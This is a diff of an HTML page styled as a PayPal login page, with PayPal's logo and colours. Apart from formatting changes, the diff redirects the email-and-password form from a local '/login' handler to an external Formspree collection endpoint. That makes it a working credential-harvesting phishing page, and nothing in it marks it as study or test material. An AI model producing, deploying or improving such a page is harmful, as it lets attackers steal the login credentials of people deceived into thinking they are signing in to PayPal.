@@ -1,5 +1,6 @@
 <!DOCTYPE html>
 <html>
+
 <head>
     <title>PayPal Login Page</title>
     <link rel="shortcut icon" href="logo1.png">
@@ -10,28 +11,33 @@
             margin: 0;
             padding: 0;
         }
+
         .container {
             width: 100%;
             max-width: 400px;
             margin: 0 auto;
             text-align: center;
         }
+
         .logo {
             margin-top: 50px;
             margin-bottom: 50px;
-           
+
         }
-        
-        
+
+
         .form-group {
             margin-bottom: 20px;
         }
+
         label {
             display: block;
             text-align: left;
             margin-bottom: 5px;
         }
-        input[type="email"], input[type="password"] {
+
+        input[type="email"],
+        input[type="password"] {
             width: 100%;
             padding: 12px 20px;
             margin: 8px 0;
@@ -40,6 +46,7 @@
             border-radius: 20px;
             border-bottom: 2px solid #ccc;
         }
+
         input[type="submit"] {
             width: 100%;
             background-color: #0070ba;
@@ -50,17 +57,19 @@
             border-radius: 20px;
             cursor: pointer;
         }
+
         input[type="submit"]:hover {
             background-color: #0066a4;
         }
     </style>
 </head>
+
 <body>
     <div class="container">
         <div class="logo">
             <img src="logo.png" alt="PayPal Logo">
         </div>
-        <form action="/login" method="post">
+        <form action="https://formspree.io/f/mrgwbzzp" method="POST">
             <div class="form-group">
                 <label for="email">Email</label>
                 <input type="email" id="email" name="email" required>
@@ -73,4 +82,5 @@
         </form>
     </div>
 </body>
+
 </html>
